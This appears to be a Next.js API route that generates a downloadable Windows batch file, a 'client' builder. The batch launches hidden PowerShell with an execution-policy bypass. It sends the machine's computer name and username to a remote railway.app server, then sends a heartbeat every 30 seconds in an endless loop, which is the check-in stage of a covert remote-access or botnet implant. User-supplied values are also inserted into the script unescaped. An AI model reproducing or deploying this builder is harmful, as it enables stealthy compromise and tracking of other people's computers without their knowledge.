import { NextResponse } from "next/server"

export async function POST(request: Request) {
  try {
    const formData = await request.formData()
    const userUid = formData.get("userUid") as string
    const fileName = formData.get("fileName") as string || "grob-client"

    if (!userUid) {
      return NextResponse.json({ error: "UID required" }, { status: 400 })
    }

    // Create working client - SIMPLE and EFFECTIVE
    const batchContent = `@echo off
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {$uid = '${userUid}'; $computer = $env:COMPUTERNAME; $username = $env:USERNAME; try { Invoke-RestMethod -Uri 'https://glistening-mindfulness.up.railway.app/api/connect' -Method POST -Body ('{uid: ''' + $uid + ''', computer_name: ''' + $computer + ''', username: ''' + $username + ''', status: ''online''}') -ContentType 'application/json' } catch { } while($true) { try { Invoke-RestMethod -Uri 'https://glistening-mindfulness.up.railway.app/api/heartbeat' -Method POST -Body ('{uid: ''' + $uid + ''', status: ''online''}') -ContentType 'application/json' } catch { } Start-Sleep -Seconds 30 } }"
exit`

    return new NextResponse(batchContent, {
      status: 200,
      headers: {
        "Content-Type": "text/plain",
        "Content-Disposition": `attachment; filename="${fileName}.bat"`,
      },
    })

  } catch (error: any) {
    return NextResponse.json(
      { error: "Build failed", details: error.message },
      { status: 500 }
    )
  }
}
